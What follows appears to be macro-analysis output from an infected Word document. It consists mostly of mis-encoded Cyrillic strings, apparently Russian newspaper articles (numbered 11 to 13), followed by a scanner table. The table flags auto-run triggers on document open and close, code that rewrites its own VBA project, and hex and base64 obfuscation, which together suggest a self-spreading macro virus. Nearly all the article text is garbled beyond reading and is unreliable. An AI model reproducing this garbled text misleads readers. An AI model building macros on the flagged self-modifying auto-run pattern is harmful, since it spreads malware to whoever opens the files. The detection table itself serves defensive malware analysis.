'湾耢铗? 磬 蝾, 黩?� �怆���?噔蝾痤?桎彖 磬��?汔珏螓, � 躅蝈豚 猁 磬镱祉栩?锣?怦屐 ?礤钺躅滂祛耱?耦犭�溴�? �脲戾眚囵睇� �蜩麇耜�?眍痨, 觐蝾瘥?禧 磬痼�桦�, 疣耧痤耱疣?� 汔珏蝮, 蜞?耜噻囹? 磬耔朦眍. 项-祛屐? ��?礤 漕腈眍 镱恹�囹� 邋 疱轵桧? ?赅?疣?磬钺铕铗. 添?赅驽蝰�, 黩?赅驿�� 漕腈屙 桁弪?忸珈铈眍耱?恹徼疣螯, 黩?屐?麒蜞螯. 湾朦? 腓 皲咫囹?蜞牦?镳钽疣祆? 觐蝾疣� 镱玮铍�豚 猁 麒蜞蝈膻 翳朦蝠钼囹?桧纛痨圉棹, 漕耱噔?屐簋 忤痼耦?镱 蝈戾. 袜 恹躅?漕腈眍 桎蜩 蝾朦觐 蝾, 黩?铐 驽豚弪 麒蜞螯. 体? 蜞赕?桧蝈疱耋弪: 礤朦? 腓 镳邃铖蜞忤螯 镱蝈眦栲朦睇?麒蜞蝈??忸珈铈眍耱?恹徼疣螯, 耱囗钼栩��� 腓 桁 礤忸朦睇扈 疣耧痤耱疣龛蝈?扈 汔珏螓 桦?礤? 湾朦? 腓 桁 镳?礤钺躅滂祛耱?耱噔栩?磬 疋铊?爨�桧�?赅觐?龛狍潼 篑腩忭�� 珥嚓 潆� 忤痼襦, 觐蝾瘥?狍溴?犭铌桊钼囹?邈?疣珈眍驽龛? 橡邃豚汔?镱潴爨螯 磬?�蜩�.
'?妁? 赅?篦栩咫?腓蝈疣蝮瘥 � 磬 耦狁蜮屙眍?铒��?珥帼, 黩??镱耠邃礤?怵屐� 箴钼屙?沭囔铗眍耱?膻溴?玎戾蝽?耥桤桦?; ��?�怆屙桢 玎蝠铐箅??磬�� 皴牝? 阻蜞� 爨蝈痂嚯?礤觐蝾瘥?磬��?噔蝾痤? 镳邃磬珥圜屙睇?潆� 镥鬣蜩, � 磬��??龛?祉铈羼蜮?疣珥铑狃噻睇?铠栳铌 ?铒鬻囹铌. 碾� 桴 桉镳噔脲龛� 忸 怦艴 汔珏蜞?桁妣蝰� 觐痧尻蝾瘥, ??磬��?- 礤? ?耦忮蝮?泐耧钿桧?滂疱牝铕?镱潴爨螯 ?忖邃屙梃 漕腈眍耱?觐痧尻蝾疣.
'秒噔睇?腓蝈疣蝮痤忮?囗嚯栩桕 皴牝?? ? 缅眍忄
'Articl #11
'崖紊  氯杏?- 崖稳倘  杏世倘.
'橡彐溴 怦邈? 躅蝈腩顸 猁 磬镱祉栩?怦屐, 牝?玟羼?镳桉篁耱怏弪, 黩?忤痼? 觐蝾瘥?禧 疣耧痤耱疣?屐 磬�� 汔珏蝮, �怆�弪? 忮顸爨 铗忮蝰蜮屙睇?桤溴腓屐: 铐 漕腈屙 箐钼脲蜮铕�螯 牦麇 疣珥�� 蝠遽钼囗栝, 镱 礤祗 膻滂 耋???磬? ?磬��?牦朦蝮疱 ?觐祜��蝈痦铋 沭囔铗眍耱? 添?赅驽蝰� 忮顸爨 耱疣眄��, 黩?忤痼?耦玟帼?膻滂, 桁妣��?忮顸爨 蝮爨眄铄 镳邃耱噔脲龛??磬��?疣犷蝈, ?疣耧痤耱疣?屐簋 桧纛痨圉棹 ?礤泐 忭铖桁 禧; ��?耱嚯?钿眍?桤 镳梓桧 礤觐痧尻蝽铋 疣犷螓 忤痼襦 镳?恹躅溴 镥疴钽?眍戾疣 汔珏螓, ?礤桤忮耱眍, 耜铍��?铠栳铌 ��?祛驽?磬溴豚螯 ?溧朦礤轼屐. 项�蝾�? � 聍栩帼 礤钺躅滂禧?耦玟噔囹?�蝾� 忤痼?疋铊扈 痼赅扈. 如 耱囵钽?忤痼襦 礤钺躅滂祛 忡�螯 襦祛?塍鼬邋 ?恹疱玎螯 襦祛?躞澍邋, 疣珞戾弪?, ?耦犭�溴龛�?怦艴 镳噔 邈?噔蝾痤? 翌, 黩?镳邃腩骅豚 疣礤?理磬 丸觐豚邂磬 徨珞耠钼眍 玎耠箧桠噱?忭桁囗?, ?磬?�蜩� 蝾驽 耠邃箦?镱疣犷蜞螯.
'碾� 恹镱腠屙? 镱漕犴铋 疣犷螓 礤钺躅滂?镳钽疣祆桉??铒�蝾� 耦玟囗? ?疣耧痤耱疣礤龛� 爨牮钼桊篑钼. 项痼鬣螯 蜞牦?疣犷蝮 汶噔眍祗 镳钽疣祆桉蝮 皴牝?礤鲥脲耦钺疣珥?镱 镳梓桧?邈?犷朦��?玎沭箧屙眍耱? ?镱�蝾�?� 聍栩帼 礤钺躅滂禧?箨铎镫尻蝾忄螯 �蜞� 汔珏螓 蜞觇?耧弼栲腓耱铎. ?邈?钺�玎眄铖蜩 漕腈眍 怩钿栩?耦玟囗桢 ?篑钼屦�屙耱忸忄龛� 怦邈?镳钽疣祆眍泐 钺羼镥麇龛� 汔珏螓, 怅膻鬣� ?忤痼?
'蔫疱牝铕 汔珏螓 ? ?  髓耋眍
'Articl #12
'疼 - 吕? 论 - 屠?
'枢?箧?箫铎桧嚯铖??镥疴铎 眍戾疱 "冷耜钽?钽?", 潆� 磬��?汔珏螓 铖蝠?耱铊?镳钺脲爨 钺疣蝽铋 疋�玷 ?麒蜞蝈?扈. ?磬耱?��?祛戾眚 禧 桉镱朦珞屐 皴螯 觐痧羼镱礓屙蝾? 疣耧疱溴脲眄�� 镱 泐痤潴, 钿磬觐 �蝾� 耧铖钺 爨腩�趑尻蜩忮�, 觐沅?麒蜞蝈朦 桁邋?磬戾疱龛?镥疱溧螯 赅觐?腓犷 耦钺�屙�??汔珏蝮 ?恹眢驿屙 桉赅螯 怦蝠鬻??觐痧羼镱礓屙蝾? ?蝾 驽 怵屐�, 溴豚螯 觐痧羼镱礓屙蝾?脲汴?漕耱箫睇扈 禧 礤 祛驽? 蜞?赅?��?皲咫噱?桴 ?玮桁��?耦 耱铕铐?镳噔铑躔囗栩咫�睇� 铕汔眍??觐黻箴桊簋��?皴牝. 碾� 疱�屙�� 溧眄铋 镳钺脲禧 猁腩 忭羼屙?礤耜铍��?镳邃腩驽龛? 钿磬觐 怦?铐?狍潴?疱嚯桤钼囗?镱珂? ?漕 蝾泐 祛戾眚?禧 镳邃豚汔屐 疋铊?麒蜞蝈??镳铖蝾 镨襦螯 ?疱溧牿棹 镱 噤疱耋, 觐蝾瘥?镳桠钿桁 龛驽 ?玎�梏痤忄眄�?忤溴. 蒡铗 �梏� 猁?觐沅?蝾 疣琊噌铗囗 ?磬��?皴牝??镳尻疣耥?玎疱觐戾礓钼嚯 皴?. ?磬耱?�屐� 怵屐屙?铐 玎戾礤?犷脲?耦忮瘌屙睇? ?镱�蝾�?邈?桉镱朦珙忄龛??蜞觇?鲥??礤 镳梓桧栩 龛赅觐泐 簌屦徉. 项 祉屙棹 磬��?�犟镥痱�?蜞觐?�梏� 祛泱?疣聒梏痤忄螯 蝾朦觐 蝈 膻滂,
'觐蝾瘥?溴轳蜮栩咫��?驽豚�� 疋�玎螯? ?疱溧牿桢? 翔顸爨 禧 镳桧桁噱?徨?钽疣龛麇龛? 黩?赅襦弪? 膻溴? 觐蝾瘥?狍潴?�怆�螯? 腓黜? 蝾 铐?狍潴?镱溻屦汔螯? 镳钼屦赍 磬 镳桧噤脲骓铖螯 ?镳噔铑躔囗栩咫�睇� 铕汔磬? 潆� 麇泐 ?磬?羼螯 耧弼栲朦磬� 戾蝾滂赅. 义? 觐泐 禧 耦黩屐 耦蝠箐龛赅扈 恹�弩镱��眢螓?篦疱驿屙栝, 狍潴?泐忸痂螯, 黩?龛麇泐 镱漕犴钽?玟羼?礤? 襄疴�� 10 麒蜞蝈脲? 镳噔桦��?疣聒梏痤忄怿桢 噤疱? 镱塍鬣?镳桤 ?忤溴 镳噔?磬 忭孱麇疱漤簋 矬犭桕圉棹 疋铊?爨蝈痂嚯钼 ?磬��?汔珏蝈.
'务钺?镱澉屦觇忄? 礤?龛赅觐?礤钺躅滂祛耱?磬琨忄螯? 磬耱?��?桁屙屐, ?磬��?汔珏蝈 蔓 祛驽蝈 矬犭桕钼囹��� 镱?锺邂漕龛祛?桦?囗铐桁眍. 闰嚓: 噤疱?疱溧牿梃:
' 锑?  ��6泱?铍噼玮 鲮 逯珏 弯滓�嗳噜�.屙 囔柘桊狁 ?�磬徨 �焘�?祜. 铊?祚 秧 ?耧?屦濑囔???1彖?漕忄 镟牝�黟�栲铖?桉?疣
'棋豚?锣?篑镥踵!
'秒噔睇?疱溧牝铕 ? ? 亦疣耜桧
'Articl #13
'屠厝   纤劳
'枢?镱赅玎?囗嚯桤 桧蝈疴��, 忡�螓??礤觐蝾瘥?磬��?麒蜞蝈脲? 铐??犷朦�桧耱�?疋铄?桧蝈疱耋��? 忸珈铈眍耱�� 镱戾�囹� ?磬��?汔珏蝈 疋铊 钺?怆屙?, ?礤觐蝾瘥?妁??疱觌囔? 碾� �蝾�?禧 镫囗桊箦?忖羼蜩 ?疋铋 耦耱噔 耠箧狍 钺?怆屙栝 ?铗溴?疱觌囔? 义, 牝?耢铈弪 疣聒梏痤忄螯 磬?噤疱? 镱塍麒?忸珈铈眍耱?镳桉�豚�?钺?怆屙?. 碾� 蝈? 牝?礤 耢铈弪 �蝾�?皲咫囹? 禧 疣琊噌囹�忄�?耔耱屐?钺疣蝽铋 疋�玷, 铖眍忄眄簋 磬 镥疱溧麇 桧纛痨圉梃 镳?镱祛�� 爨牮钼桊篑? 镱漕犴?蝾祗, 赅?禧 镥疱镳噔?屐 锣?汔珏蝮. 蒡?耔耱屐?狍溴?"漕忮溴磬 漕 箪? 赅?蝾朦觐 ?磬?镱�忤蝰� �蜞蝽�?镳钽疣祆桉?
'丸 潆� 觐泐 礤 皴牮弪, 黩?镳栳腓驵弪? 10-脲蝽栝 �徼脲� 皴牝? ?�蝾� 溧蝈 禧 镫囗桊箦???矬犭桕圉栝, 镱疋��屙睇� 桉蝾痂?皴牝? 邋 耦玟囗棹 ?睇礤�礤� 溴�蝈朦眍耱? ?镳桡豚��?怦艴 麟屙钼 皴牝?镱戾�囹� 疋铊 矬犭桕圉梃 磬 膻狍?蝈祗, 疋�玎眄簋 ?桉蝾痂彘 皴牝?
'蔫疱牝铕 汔珏螓 ? ?  髓耋眍
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

